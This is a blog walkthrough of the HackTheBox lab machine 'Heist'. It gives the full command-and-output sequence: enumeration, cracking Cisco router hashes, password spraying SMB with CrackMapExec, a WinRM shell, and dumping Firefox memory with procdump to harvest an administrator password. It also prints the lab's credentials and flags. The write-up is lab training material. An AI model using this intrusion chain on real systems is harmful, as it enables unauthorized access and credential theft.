---
layout: post
title: Hackthebox Heist Walkthrough
categories: HackTheBox
---

![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2019-12-01/heist-badge.png)

# Explanation
<a href="https://www.hackthebox.eu">Hackthebox</a> is a website which has a bunch of vulnerable machines in its own VPN.<br>
This is a walkthrough of a box "Heist".<br>

# Solution
### 1. Initial Enumeration

#### TCP Port Scanning:
{% highlight shell %}
root@kali:~# nmap -p- 10.10.10.149 -sV -sC
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-30 16:11 EET
Nmap scan report for 10.10.10.149
Host is up (0.043s latency).
Not shown: 65530 filtered ports
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
| http-title: Support Login Page
|_Requested resource was login.php
135/tcp   open  msrpc         Microsoft Windows RPC
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49668/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 52s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2019-11-30T14:15:43
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 258.38 seconds

root@kali:~#
{% endhighlight %}

#### SMB enumeration:
{% highlight shell %}
root@kali:~# smbclient -L 10.10.10.149
Enter WORKGROUP\root's password: 
session setup failed: NT_STATUS_ACCESS_DENIED
{% endhighlight %}

#### Gobuster HTTP:
{% highlight shell %}
root@kali:~# gobuster dir -u http://10.10.10.149/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .html,.php -s '200,204,301,302,403'
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.149/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     html,php
[+] Timeout:        10s
===============================================================
2019/11/30 16:29:19 Starting gobuster
===============================================================
/index.php (Status: 302)
/images (Status: 301)
/login.php (Status: 200)
/Images (Status: 301)
/issues.php (Status: 302)
/css (Status: 301)
/Index.php (Status: 302)
/Login.php (Status: 200)
/js (Status: 301)
/Issues.php (Status: 302)
/attachments (Status: 301)
/IMAGES (Status: 301)
/INDEX.php (Status: 302)
/CSS (Status: 301)
/JS (Status: 301)
/Attachments (Status: 301)
[ERROR] 2019/11/30 17:22:44 [!] Get http://10.10.10.149/h_travel2.html: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
/LogIn.php (Status: 200)
/LOGIN.php (Status: 200)
===============================================================
2019/11/30 17:53:44 Finished
===============================================================
{% endhighlight %}

### 2. Getting User

On the port 80, we can find a login console.<br>
We don't have any credential yet but we can login as a guest.'
![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2019-12-01/2019-12-02-01-30-10.png)

Then, we can see the following messages.<br>
One of the post has an attachment that is a config file of cisco router.
![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2019-12-01/2019-12-02-01-30-34.png)
{% highlight shell %}
root@kali:~# curl http://10.10.10.149/attachments/config.txt
version 12.2
no service pad
service password-encryption
!
isdn switch-type basic-5ess
!
hostname ios-1
!
security passwords min-length 12
enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
!
username rout3r password 7 0242114B0E143F015F5D1E161713
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
!
!
ip ssh authentication-retries 5
ip ssh version 2
!
!
router bgp 100
 synchronization
 bgp log-neighbor-changes
 bgp dampening
 network 192.168.0.0 mask 300.255.255.0
 timers bgp 3 9
 redistribute connected
!
ip classless
ip route 0.0.0.0 0.0.0.0 192.168.0.1
!
!
access-list 101 permit ip any any
dialer-list 1 protocol ip list 101
!
no ip http server
no ip http secure-server
!
line vty 0 4
 session-timeout 600
 authorization exec SSH
 transport input ssh

root@kali:~# 
{% endhighlight %}

We found 3 password hashes.<br>
Cisco type 5 is MD5 and type 7 is something Cisco original.
{% highlight shell %}
$1$pdQG$o8nrSzsGXeaduXrjlvKc91
0242114B0E143F015F5D1E161713
02375012182C1A1D751618034F36415408
{% endhighlight %}

We can crack the MD5 hash and achieve the password "stealth1agent" with John the Ripper.
{% highlight shell %}
root@kali:~# cat cisco5.hash 
$1$pdQG$o8nrSzsGXeaduXrjlvKc91

root@kali:~#
{% endhighlight %}
{% highlight shell %}
root@kali:~# john cisco5.hash --wordlist=/usr/share/wordlists/rockyou.txt    
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
stealth1agent    (?)
1g 0:00:00:15 DONE (2019-11-30 19:56) 0.06561g/s 230047p/s 230047c/s 230047C/s stealthy001..stcroix85
Use the "--show" option to display all of the cracked passwords reliably
Session completed

root@kali:~#
{% endhighlight %}

Next, crack the Cisco type 7 hashes.
We can use <a href="https://passwordrecovery.io/cisco/">this website</a> for that purpose and achieve following 2 passwords.
{% highlight shell %}
$uperP@ssword
Q4)sJu\Y8qz*A3?d
{% endhighlight %}
![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2019-12-01/2019-11-30-20-34-25.png)
![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2019-12-01/2019-11-30-20-37-01.png)

Now we have the following users from "issues.php" and passwords from "/attachment/config.txt".<br>
Then, try each pattern for SMB login with <a href="https://github.com/byt3bl33d3r/CrackMapExec.git">CrackMapExec</a>.
{% highlight shell %}
root@kali:~# cat users.txt 
Hazard
Administrator

root@kali:~#
{% endhighlight %}
{% highlight shell %}
root@kali:~# cat passwords.txt 
stealth1agent
$uperP@ssword
Q4)sJu\Y8qz*A3?d

root@kali:~#
{% endhighlight %}
{% highlight shell %}
root@kali:~# apt-get install crackmapexec

---

root@kali:~# crackmapexec smb 10.10.10.149 -u users.txt -p passwords.txt 
[*] First time use detected
[*] Creating home directory structure
[*] Initializing the database
[*] Copying default configuration file
[*] Generating SSL certificate
CME          10.10.10.149:445 SUPPORTDESK     [*] Windows 10.0 Build 17763 (name:SUPPORTDESK) (domain:SUPPORTDESK)
CME          10.10.10.149:445 SUPPORTDESK     [+] SUPPORTDESK\Hazard:stealth1agent 
[*] KTHXBYE!

root@kali:~#
{% endhighlight %}

Now CME found valid credential for domain "SUPPOETDESK".
{% highlight shell %}
Hazard:stealth1agent
{% endhighlight %}

Then, try to obtain a remote access.<br>
Psexec is not available here because we don't have any SMB share we have write permission.
{% highlight shell %}
root@kali:~# python impacket/examples/psexec.py hazard@10.10.10.149
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

Password:
[*] Requesting shares on 10.10.10.149.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.

root@kali:~#
{% endhighlight %}
{% highlight shell %}
root@kali:~# smbmap -H 10.10.10.149 -u hazard -p stealth1agent
[+] Finding open SMB ports....
[+] User SMB session establishd on 10.10.10.149...
[+] IP: 10.10.10.149:445	Name: 10.10.10.149                                      
	Disk                                                  	Permissions
	----                                                  	-----------
	ADMIN$                                            	NO ACCESS
	C$                                                	NO ACCESS
	IPC$                                              	READ ONLY

root@kali:~#
{% endhighlight %}

Next, try to enumerate via on MSRPC port 5985<br>
With a script in the package "<a href="https://github.com/SecureAuthCorp/impacket">Impacket</a>", we can bruteforce the SID of Windows host.
{% highlight shell %}
root@kali:~# python impacket/examples/lookupsid.py hazard:stealth1agent@10.10.10.149
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Brute forcing SIDs at 10.10.10.149
[*] StringBinding ncacn_np:10.10.10.149[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112
500: SUPPORTDESK\Administrator (SidTypeUser)
501: SUPPORTDESK\Guest (SidTypeUser)
503: SUPPORTDESK\DefaultAccount (SidTypeUser)
504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
513: SUPPORTDESK\None (SidTypeGroup)
1008: SUPPORTDESK\Hazard (SidTypeUser)
1009: SUPPORTDESK\support (SidTypeUser)
1012: SUPPORTDESK\Chase (SidTypeUser)
1013: SUPPORTDESK\Jason (SidTypeUser)

root@kali:~# 
{% endhighlight %}

Now we found additional users.<br>
Then try to bruteforce the SMB again.
{% highlight shell %}
root@kali:~# cat users.txt 
administrator
guest
defaultaccount
WDAGUtilityAccount
support
chase
jason

root@kali:~#
{% endhighlight %}
{% highlight shell %}
root@kali:~# cat passwords.txt 
stealth1agent
$uperP@ssword
Q4)sJu\Y8qz*A3?d

root@kali:~#
{% endhighlight %}
{% highlight shell %}
root@kali:~# crackmapexec smb 10.10.10.149 -u users.txt -p passwords.txt 
CME          10.10.10.149:445 SUPPORTDESK     [*] Windows 10.0 Build 17763 (name:SUPPORTDESK) (domain:SUPPORTDESK)
CME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\administrator:stealth1agent STATUS_LOGON_FAILURE 
CME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\administrator:$uperP@ssword STATUS_LOGON_FAILURE 
CME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\administrator:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
CME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\guest:stealth1agent STATUS_LOGON_FAILURE 
CME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\guest:$uperP@ssword STATUS_LOGON_FAILURE 
CME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\guest:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
CME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\defaultaccount:stealth1agent STATUS_LOGON_FAILURE 
CME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\defaultaccount:$uperP@ssword STATUS_LOGON_FAILURE 
CME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\defaultaccount:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
CME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\WDAGUtilityAccount:stealth1agent STATUS_LOGON_FAILURE 
CME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\WDAGUtilityAccount:$uperP@ssword STATUS_LOGON_FAILURE 
CME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\WDAGUtilityAccount:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
CME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\support:stealth1agent STATUS_LOGON_FAILURE 
CME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\support:$uperP@ssword STATUS_LOGON_FAILURE 
CME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\support:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
CME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\chase:stealth1agent STATUS_LOGON_FAILURE 
CME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\chase:$uperP@ssword STATUS_LOGON_FAILURE 
CME          10.10.10.149:445 SUPPORTDESK     [+] SUPPORTDESK\chase:Q4)sJu\Y8qz*A3?d 
[*] KTHXBYE!

root@kali:~#
{% endhighlight %}

Now we found additional credential.
{% highlight shell %}
chase:Q4)sJu\Y8qz*A3?d
{% endhighlight %}

Still we can not use Psexec, but this time we can login via WinRM.<br>
This time, "<a href="https://github.com/Hackplayers/evil-winrm">evil-winrm</a>" was used for the user shell as "Chase".
{% highlight shell %}
root@kali:~# python impacket/examples/psexec.py 'chase:Q4)sJu\Y8qz*A3?d@10.10.10.149'
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Requesting shares on 10.10.10.149.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.

root@kali:~#
{% endhighlight %}
{% highlight shell %}
root@kali:~# gem install evil-winrm

root@kali:~# evil-winrm -u Chase -p "Q4)sJu\Y8qz*A3?d" -i 10.10.10.149

Evil-WinRM shell v2.0

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Chase\Documents> whoami
supportdesk\chase

*Evil-WinRM* PS C:\Users\Chase\Documents>
{% endhighlight %}

user.txt is in a directory "C:\Users\Chase\Desktop"
{% highlight shell %}
*Evil-WinRM* PS C:\Users\Chase\Desktop> type user.txt
a127daef77ab6d9d92008653295f59c4

*Evil-WinRM* PS C:\Users\Chase\Desktop>
{% endhighlight %}

### 3. Getting Root

In the directory "C:\Users\Chase\Desktop", we have another text file "todo.txt".
{% highlight shell %}
*Evil-WinRM* PS C:\Users\Chase\Desktop> dir


    Directory: C:\Users\Chase\Desktop


Mode                LastWriteTime         Length Name                                                                                                                                                                                                    
----                -------------         ------ ----                                                                                                                                                                                                    
-a----        4/22/2019   9:08 AM            121 todo.txt                                                                                                                                                                                                
-a----        4/22/2019   9:07 AM             32 user.txt                                                                                                                                                                                                


*Evil-WinRM* PS C:\Users\Chase\Desktop>
{% endhighlight %}
{% highlight shell %}
*Evil-WinRM* PS C:\Users\Chase\Desktop> type todo.txt
Stuff to-do:
1. Keep checking the issues list.
2. Fix the router config.

Done:
1. Restricted access for guest user.

*Evil-WinRM* PS C:\Users\Chase\Desktop>
{% endhighlight %}

Then, check the running processes.
{% highlight shell %}
*Evil-WinRM* PS C:\Users\Chase\Documents> get-process

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                                                                                                                                                    
-------  ------    -----      -----     ------     --  -- -----------                                                                                                                                                                                    
    458      18     2404       5512               408   0 csrss                                                                                                                                                                                          
    295      17     2472       5368               504   1 csrss                                                                                                                                                                                          
    358      15     3528      14636              4172   1 ctfmon                                                                                                                                                                                         
    257      14     4152      13588              3948   0 dllhost                                                                                                                                                                                        
    164       9     1880       9836       0.31   5464   1 dllhost                                                                                                                                                                                        
    617      32    34112      59008               716   1 dwm                                                                                                                                                                                            
   1494      58    24008      78864              5488   1 explorer                                                                                                                                                                                       
    343      19    10164      37648       0.56   1088   1 firefox                                                                                                                                                                                        
    390      34    63592      95860      85.36   1716   1 firefox                                                                                                                                                                                        
    358      26    16292      37592       1.00   4296   1 firefox                                                                                                                                                                                        
    408      31    17404      63240       3.84   4704   1 firefox                                                                                                                                                                                        
   1121      72   149076     484916      44.81   4968   1 firefox                                                                                                                                                                                        
     49       6     1440       3732               808   0 fontdrvhost                                                                                                                                                                                    
     49       6     1796       4748               980   1 fontdrvhost                                                                                                                                                                                    
      0       0       56          8                 0   0 Idle                                                                                                                                                                                           
   1009      23     6432      15252               648   0 lsass                                                                                                                                                                                          
    227      13     3096      10360              4228   0 msdtc                                                                                                                                                                                          
    570      62   129624     147492              2980   0 MsMpEng                                                                                                                                                                                        
      0      13      308      52948               104   0 Registry                                                                                                                                                                                       
    290      15     5304      16412              1952   1 RuntimeBroker                                                                                                                                                                                  
    275      14     3080      15260              4800   1 RuntimeBroker                                                                                                                                                                                  
    144       8     1652       7684              5592   1 RuntimeBroker                                                                                                                                                                                  
    672      32    19940      49180              6064   1 SearchUI                                                                                                                                                                                       
    542      11     5368       9964               628   0 services                                                                                                                                                                                       
    683      29    15324      40896              5960   1 ShellExperienceHost                                                                                                                                                                            
    439      17     4988      24112              4740   1 sihost                                                                                                                                                                                         
     53       3      524       1216               324   0 smss                                                                                                                                                                                           
    475      23     5840      16364              2564   0 spoolsv                                                                                                                                                                                        
    168      11     2508      13208                68   0 svchost                                                                                                                                                                                        
    203      12     2040       9672               364   0 svchost                                                                                                                                                                                        
    115       7     1272       5344               480   0 svchost                                                                                                                                                                                        
    128       7     1256       5720               500   0 svchost                                                                                                                                                                                        
    284      13     4292      11328               528   0 svchost                                                                                                                                                                                        
    127       7     1392       6216               668   0 svchost                                                                                                                                                                                        
    149       9     1720      11720               708   0 svchost                                                                                                                                                                                        
     85       5      912       3848               764   0 svchost                                                                                                                                                                                        
    862      20     6984      22608               788   0 svchost                                                                                                                                                                                        
    866      16     5368      11884               868   0 svchost                                                                                                                                                                                        
    252      11     2088       7800               920   0 svchost                                                                                                                                                                                        
    390      13    11184      15124              1064   0 svchost                                                                                                                                                                                        
    122      15     3652       7704              1172   0 svchost                                                                                                                                                                                        
    188       9     1836       7616              1220   0 svchost                                                                                                                                                                                        
    232      12     2456      11064              1228   0 svchost                                                                                                                                                                                        
    156       7     1240       5684              1240   0 svchost                                                                                                                                                                                        
    214       9     2200       7520              1248   0 svchost                                                                                                                                                                                        
    431       9     2952       9120              1260   0 svchost                                                                                                                                                                                        
    175       9     1524       7256              1272   0 svchost                                                                                                                                                                                        
    140       7     1320       5744              1372   0 svchost                                                                                                                                                                                        
    344      15     4360      11612              1424   0 svchost                                                                                                                                                                                        
    172      11     1848       8096              1436   0 svchost                                                                                                                                                                                        
    378      17     5036      14284              1444   0 svchost                                                                                                                                                                                        
    226      13     3104       8448              1552   0 svchost                                                                                                                                                                                        
    284      12     1900       8024              1560   0 svchost                                                                                                                                                                                        
    193      13     2208      12100              1632   0 svchost                                                                                                                                                                                        
    323      10     2668       8516              1640   0 svchost                                                                                                                                                                                        
    163      10     1968       6712              1780   0 svchost                                                                                                                                                                                        
    399      31     8732      17152              1864   0 svchost                                                                                                                                                                                        
    159       9     2196       7556              1916   0 svchost                                                                                                                                                                                        
    198      11     2008       8212              1932   0 svchost                                                                                                                                                                                        
    240      11     2568       9916              2060   0 svchost                                                                                                                                                                                        
    389      19    15116      32160              2216   0 svchost                                                                                                                                                                                        
    167      11     3912      10908              2636   0 svchost                                                                                                                                                                                        
    265      13     2564       7868              2640   0 svchost                                                                                                                                                                                        
    233      25     3404      12620              2652   0 svchost                                                                                                                                                                                        
    405      16    12968      21976              2664   0 svchost                                                                                                                                                                                        
    473      20    13512      28352              2672   0 svchost                                                                                                                                                                                        
    137       9     1652       6596              2700   0 svchost                                                                                                                                                                                        
    140       8     1512       6184              2776   0 svchost                                                                                                                                                                                        
    210      11     2556       8532              2800   0 svchost                                                                                                                                                                                        
    126       7     1224       5396              2816   0 svchost                                                                                                                                                                                        
    213      12     1896       7532              2852   0 svchost                                                                                                                                                                                        
    233      14     4756      11896              2920   0 svchost                                                                                                                                                                                        
    468      18     3444      11752              2988   0 svchost                                                                                                                                                                                        
    276      28     5352      14288              3020   0 svchost                                                                                                                                                                                        
    169      10     2164      13324              3040   0 svchost                                                                                                                                                                                        
    387      24     3444      12360              3236   0 svchost                                                                                                                                                                                        
    254      13     3560      12716              3260   0 svchost                                                                                                                                                                                        
    365      18     5600      26880              4020   1 svchost                                                                                                                                                                                        
    227      11     2880      10960              4512   0 svchost                                                                                                                                                                                        
    232      12     3068      13548              4768   1 svchost                                                                                                                                                                                        
    169       9     4324      12040              4820   0 svchost                                                                                                                                                                                        
    207      11     2912      12072              5116   0 svchost                                                                                                                                                                                        
    251      14     3192      13840              5208   0 svchost                                                                                                                                                                                        
    210      15     6416      10652              5424   0 svchost                                                                                                                                                                                        
    327      16    16024      18288              6580   0 svchost                                                                                                                                                                                        
    163       9     3104       7664              6688   0 svchost                                                                                                                                                                                        
    297      20    10704      14752              6788   0 svchost                                                                                                                                                                                        
   1937       0      192        152                 4   0 System                                                                                                                                                                                         
    210      21     4548      13204              4184   1 taskhostw                                                                                                                                                                                      
    298      18     5260      15724              7112   1 taskhostw                                                                                                                                                                                      
    178      12     3200      10356              2836   0 VGAuthService                                                                                                                                                                                  
    245      18     3884      15040              1940   1 vmtoolsd                                                                                                                                                                                       
    384      22     9464      22456              2828   0 vmtoolsd                                                                                                                                                                                       
    175      11     1508       6860               488   0 wininit                                                                                                                                                                                        
    286      13     2732      12920               560   1 winlogon                                                                                                                                                                                       
    344      16    10428      19688              3992   0 WmiPrvSE                                                                                                                                                                                       
    635      28    51756      66952       0.64   3120   0 wsmprovhost                                                                                                                                                                                    
    588      27   166464     184692       6.63   5044   0 wsmprovhost                                                                                                                                                                                    


*Evil-WinRM* PS C:\Users\Chase\Documents>
{% endhighlight %}

We can find out even though this is server, Firefox is running.
{% highlight shell %}
*Evil-WinRM* PS C:\Users\Chase\Desktop> get-process -name firefox

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                                                                                                                                                    
-------  ------    -----      -----     ------     --  -- -----------                                                                                                                                                                                    
   1149      74   151660     190244      43.80   4908   1 firefox                                                                                                                                                                                        
    341      19     9952      37304       0.69   6024   1 firefox                                                                                                                                                                                        
    408      31    17036      62692       2.70   6256   1 firefox                                                                                                                                                                                        
    390      34    59020      90736     117.78   6564   1 firefox                                                                                                                                                                                        
    358      26    16360      37556       0.66   6728   1 firefox                                                                                                                                                                                        


*Evil-WinRM* PS C:\Users\Chase\Desktop> 
{% endhighlight %}

To obtain information from the process, we can use a tool <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump">Procdump</a>.<br>
Download it and extract, then upload the "procdump.exe" binary with a command "upload".
{% highlight shell %}
*Evil-WinRM* PS C:\Users\Chase\Documents> upload procdump.exe
Info: Uploading procdump.exe to C:\Users\Chase\Documents\procdump.exe

Data: 868564 bytes of 868564 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\Chase\Documents>
{% endhighlight %}

Then, execute the "procdump.exe".<br>
It generates a process file for the firefox and this time 5 files are created with 5 command executions for 5 processes.
{% highlight shell %}
*Evil-WinRM* PS C:\Users\Chase\Desktop> ./procdump.exe -ma 6728 -accepteula

ProcDump v9.0 - Sysinternals process dump utility
Copyright (C) 2009-2017 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[02:28:58] Dump 1 initiated: C:\Users\Chase\Desktop\firefox.exe_191202_022858.dmp
[02:28:58] Dump 1 writing: Estimated dump file size is 280 MB.
[02:29:02] Dump 1 complete: 281 MB written in 3.4 seconds
[02:29:02] Dump count reached.

*Evil-WinRM* PS C:\Users\Chase\Desktop> 
{% endhighlight %}

Try to analyze the process file.<br>
To look for a word "password" in the process and we can find an URL parameter "password".
{% highlight shell %}
*Evil-WinRM* PS C:\Users\Chase\Documents> cat firefox.exe_191202_042810.dmp | Select-String "password"

---

Firefox\firefox.exeMOZ‘27�ÄGáõþGáõþRG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=MOZ_CRASHREPORTER_STRINGS_OVERRIDE=C:\Program Files\Mozilla Firefox\browser\crashreporter-override.iniNU

---

{% endhighlight %}

Now we found the following credential.
{% highlight shell %}
admin:4dD!5}x/re8]FBuZ
{% endhighlight %}

Then, try to login with the following way.<br>
We can achieve administrator shell.
{% highlight shell %}
root@kali:~# evil-winrm -u Administrator -p '4dD!5}x/re8]FBuZ' -i 10.10.10.149

Evil-WinRM shell v2.0

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
supportdesk\administrator

*Evil-WinRM* PS C:\Users\Administrator\Documents>
{% endhighlight %}

As always. root.txt is in the directory "C:\Users\Administrator\Desktop".
{% highlight shell %}
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name                                                                                                                                                                                                    
----                -------------         ------ ----                                                                                                                                                                                                    
-a----        4/22/2019   9:05 AM             32 root.txt                                                                                                                                                                                                


*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
50dfa3c6bfd20e2e0d071b073d766897

*Evil-WinRM* PS C:\Users\Administrator\Desktop> 
{% endhighlight %}
